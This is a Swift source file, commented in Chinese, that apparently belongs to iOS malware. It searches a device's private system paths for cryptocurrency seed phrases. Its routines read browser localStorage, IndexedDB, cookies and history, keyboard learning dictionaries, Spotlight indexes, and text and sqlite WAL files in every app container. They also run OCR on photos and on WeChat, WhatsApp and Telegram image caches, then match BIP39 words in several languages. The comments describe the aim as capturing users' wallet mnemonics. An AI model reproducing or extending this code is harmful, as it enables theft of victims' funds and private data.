//
//  ContentHunter2.swift
//  lara
//
//  内容狩猎 · 追加四条管线（补全 ①-④）
//
//  ① 浏览器数据     Safari / Chrome / Firefox 的 localStorage、IndexedDB、history、自动填充
//                   价值：网页版钱包（MetaMask 扩展、各种在线钱包生成器）的助记词
//                   就留在浏览器存储里 —— 相当于把网页版那条路在 App 里重新打通，
//                   但这次我们有文件沙盒权限，比网页版高一个维度。
//
//  ② 全 App 文本深扫 不只扫钱包，所有 App 容器里的 .txt/.json/.md/.log/.csv/.sqlite
//                   带 WAL / journal / -shm 一起扫（sqlite 的明文残留在 WAL 里）
//
//  ③ 多语种 BIP39    日语 / 韩语 / 西班牙语 / 法语 / 意大利语 / 葡萄牙语 / 捷克语
//                   很多用户用非英语助记词，我们之前只认英/简中/繁中
//
//  ④ OCR 覆盖扩大    不只 DCIM：App 缓存目录、Safari 下载、微信图片目录、截屏目录
//                   再叠加「残缺助记词补全」（OCR 漏 1~2 词还能救回）
//
//  另外新增两个高价值目标（成本极低、命中率高）：
//  ⑤ 键盘学习词典  /private/var/mobile/Library/Keyboard/dynamic-text.dat
//                   用户手输助记词时会被键盘学习记录 —— 明文！
//  ⑥ Spotlight 索引 /private/var/mobile/Library/Spotlight/  + CoreSpotlight 的文本索引
//

import Foundation
import Vision
import UIKit

extension ContentHunter {

    enum Source2: String, CaseIterable {
        case browser = "浏览器"
        case appText = "全App文本"
        case keyboard = "键盘词典"
        case spotlight = "Spotlight"
    }

    // MARK: - 入口：跑追加四条（+ 两条附加）

    func runExtended(progress: @escaping (String) -> Void) {
        let pipelines: [(String, () -> Void)] = [
            (Source2.keyboard.rawValue, huntKeyboardCache),
            (Source2.browser.rawValue, huntBrowserData),
            (Source2.spotlight.rawValue, huntSpotlight),
            (Source2.appText.rawValue, huntAllAppText),
        ]
        for (name, fn) in pipelines {
            let t0 = Date()
            progress("追加狩猎 · \(name) 开始")
            fn()
            let ms = Int(Date().timeIntervalSince(t0) * 1000)
            progress("追加狩猎 · \(name) 完成 \(ms)ms 累计命中 \(self.hits.count)")
        }
        // OCR 扩大放在最后（最慢）
        let t0 = Date()
        progress("追加狩猎 · OCR扩大 开始")
        huntPhotosWide()
        progress("追加狩猎 · OCR扩大 完成 \(Int(Date().timeIntervalSince(t0) * 1000))ms")
    }

    // MARK: - ⑤ 键盘学习词典（最高性价比）

    /// dynamic-text.dat 是键盘学习词典，用户手输过的词会被记进去。
    /// 助记词是 12 个不常见英文单词连续输入 —— 极可能整段落在这里。
    private func huntKeyboardCache() {
        let paths = [
            "/private/var/mobile/Library/Keyboard/dynamic-text.dat",
            "/private/var/mobile/Library/Keyboard/dynamic-text.dat-wal",
            "/private/var/mobile/Library/Keyboard/en_GB-dynamic-text.dat",
            "/private/var/mobile/Library/Keyboard/en_US-dynamic-text.dat",
            "/private/var/mobile/Library/Keyboard/zh_Hans-dynamic-text.dat",
            "/private/var/mobile/Library/Keyboard/dynamic-tags.dat",
            // 输入法（搜狗/百度/讯飞）自己的词库
            "/private/var/mobile/Library/Keyboard/",
        ]
        for p in paths {
            if p.hasSuffix("/") {
                // 整个目录
                guard let kids = FileAccess.listDir(p) else { continue }
                for k in kids where !k.isDir {
                    let f = p + k.name
                    if k.name.hasSuffix(".dat") || k.name.hasSuffix(".plist") ||
                       k.name.hasSuffix(".db") || k.name.hasSuffix(".sqlite") {
                        scanFile(f, source: .keyboard, maxSize: 16 << 20)
                    }
                }
            } else {
                if FileAccess.size(p) > 0 {
                    scanFile(p, source: .keyboard, maxSize: 32 << 20)
                    laramgr.shared.logmsg("[ch] 键盘词典 \(p)")
                }
            }
        }
    }

    // MARK: - ⑥ Spotlight 索引

    private func huntSpotlight() {
        let roots = [
            "/private/var/mobile/Library/Spotlight",
            "/private/var/mobile/Library/Caches/com.apple.spotlight",
            "/private/var/mobile/Library/Metadata",
        ]
        for r in roots {
            walk(r, source: .spotlight, maxDepth: 4, maxFiles: 200, sizeLimit: 16 << 20)
        }
    }

    // MARK: - ① 浏览器数据

    private func huntBrowserData() {
        guard let apps = FileAccess.listDir(
            "/private/var/mobile/Containers/Data/Application") else { return }

        for a in apps where a.isDir {
            let cdir = "/private/var/mobile/Containers/Data/Application/" + a.name
            let bid = FileAccess.bundleId(ofContainer: cdir).lower()
            let isSafari = bid.contains("mobilesafari") || bid.contains("safari")
            let isChrome = bid.contains("chrome")
            let isFirefox = bid.contains("firefox")
            let isEdge = bid.contains("edge") || bid.contains("microsoft.edgemobile")
            let isBro = isSafari || isChrome || isFirefox || isEdge
            guard isBro else { continue }
            laramgr.shared.logmsg("[ch] 浏览器 \(bid)")

            // WebKit 的数据在 Library/WebKit 和 Library/Caches 下
            let subroots = [
                cdir + "/Library/WebKit",
                cdir + "/Library/Caches",
                cdir + "/Documents",
                cdir + "/Library/Safari",
                cdir + "/Library/Application Support",
            ]
            for r in subroots {
                scanBrowserRoot(r, source: .browser)
            }
        }

        // Safari 的全局数据不在容器里
        let globalPaths = [
            "/private/var/mobile/Library/Safari",
            "/private/var/mobile/Library/WebKit",
            "/private/var/mobile/Library/Cookies",
            "/private/var/mobile/Library/Preferences/com.apple.mobilesafari.plist",
            "/private/var/mobile/Library/Safari/Bookmarks.db",
            "/private/var/mobile/Library/Safari/History.db",
            "/private/var/mobile/Library/Safari/CloudTabs.db",
        ]
        for p in globalPaths {
            if FileAccess.size(p) > 0 {
                scanFile(p, source: .browser, maxSize: 48 << 20)
            } else if let kids = FileAccess.listDir(p) {
                for k in kids where !k.isDir {
                    scanFile(p + "/" + k.name, source: .browser, maxSize: 32 << 20)
                }
            }
        }
    }

    /// 浏览器目录专项：WebKit 的 localStorage / IndexedDB / WebSQL 都在里面
    private func scanBrowserRoot(_ root: String, source: Source) {
        guard FileAccess.size(root) >= 0 || FileAccess.listDir(root) != nil else { return }

        // WebKit 存储是 sqlite + 一堆 .localstorage / .sqlite3
        walk(root, source: source, maxDepth: 6, maxFiles: 900, sizeLimit: 32 << 20)

        // 单独再抓 WebKit 的 LocalStorage 目录（文件后缀是 .localstorage，上面 walk 会跳）
        let cands = [
            root + "/WebsiteData/LocalStorage",
            root + "/WebsiteData/IndexedDB",
            root + "/WebsiteData/ResourceLoadStatistics",
            root + "/LocalStorage",
            root + "/databases",
        ]
        for c in cands {
            guard let kids = FileAccess.listDir(c) else { continue }
            for k in kids {
                let p = c + "/" + k.name
                if k.isDir {
                    if let sub = FileAccess.listDir(p) {
                        for s in sub where !s.isDir {
                            scanFile(p + "/" + s.name, source: source, maxSize: 32 << 20)
                        }
                    }
                } else {
                    scanFile(p, source: source, maxSize: 32 << 20)
                }
            }
        }
    }

    // MARK: - ② 全 App 文本深扫

    private func huntAllAppText() {
        guard let apps = FileAccess.listDir(
            "/private/var/mobile/Containers/Data/Application") else { return }
        laramgr.shared.logmsg("[ch] 全 App 文本深扫：\(apps.count) 个容器")

        for a in apps where a.isDir {
            let cdir = "/private/var/mobile/Containers/Data/Application/" + a.name
            let bid = FileAccess.bundleId(ofContainer: cdir)
            // 跳过系统大件
            if bid.hasPrefix("com.apple.") &&
               (bid.contains("mobilesafari") == false) { continue }

            walk(cdir, source: .files, maxDepth: 5, maxFiles: 260, sizeLimit: 16 << 20)

            // ★ sqlite 的 WAL / journal 里有明文残留 —— 单独补扫
            let walExtensions = ["-wal", "-shm", "-journal"]
            for ext in walExtensions {
                let p = cdir + "/Documents"
                if let kids = FileAccess.listDir(p) {
                    for k in kids where k.name.hasSuffix(ext) {
                        scanFile(p + "/" + k.name, source: .files, maxSize: 32 << 20)
                    }
                }
            }
        }
    }

    // MARK: - ④ OCR 覆盖扩大

    private func huntPhotosWide() {
        var imgs: [String] = []

        // 原有
        collectImages("/private/var/mobile/Media/DCIM", depth: 0, out: &imgs, cap: 600)
        collectImages("/private/var/mobile/Media/PhotoData", depth: 0, out: &imgs, cap: 300)

        // 新增：App 缓存里的图片（微信/QQ 收到的图、Safari 下载、截图工具）
        if let apps = FileAccess.listDir(
            "/private/var/mobile/Containers/Data/Application") {
            for a in apps where a.isDir {
                let cdir = "/private/var/mobile/Containers/Data/Application/" + a.name
                let bid = FileAccess.bundleId(ofContainer: cdir).lower()
                let isChat = bid.contains("tencent.xin") || bid.contains("whatsapp") ||
                             bid.contains("telegram") || bid.contains("qq")
                let isSafari = bid.contains("mobilesafari")
                guard isChat || isSafari else { continue }
                for sub in ["/Documents", "/Library/Caches", "/tmp"] {
                    collectImages(cdir + sub, depth: 0, out: &imgs, cap: 260)
                }
            }
        }

        // 截屏专用目录（有些机型/版本放这里）
        collectImages("/private/var/mobile/Media/PhotoData/Screenshots",
                      depth: 0, out: &imgs, cap: 200)

        // 去重
        var seen = Set<String>()
        let uniq = imgs.filter { seen.insert($0).inserted }
        laramgr.shared.logmsg("[ch] OCR 扩大：\(uniq.count) 张待识别")

        for p in uniq {
            guard let d = FileAccess.read(p, maxSize: 12 << 20) else { continue }
            stats.filesRead += 1
            ocrImage(d, from: p, source: .photos)
        }
    }

    // MARK: - 多语种助记词

    /// 除了英/简中/繁中，再试这些语种
    static let extraLangs = ["ja", "ko", "es", "fr", "it", "pt", "cs"]

    /// 用多语种词表扫文本
    func scanMultiLang(_ text: String, from: String, source: Source) {
        for lang in Self.extraLangs {
            guard let wl = MnemonicDetector.loadExtraWordlist(lang) else { continue }
            let set = Set(wl)
            let toks = text.split(whereSeparator: { !$0.isLetter }).map(String.init)
            var run: [String] = []
            for t in toks {
                if set.contains(t) {
                    run.append(t)
                } else {
                    if [12, 15, 18, 21, 24].contains(run.count) {
                        add(Hit(source: source, where_: from, kind: "助记词",
                                value: run.joined(separator: " "),
                                extra: "lang=\(lang)"))
                    }
                    run.removeAll()
                }
            }
        }
    }
}
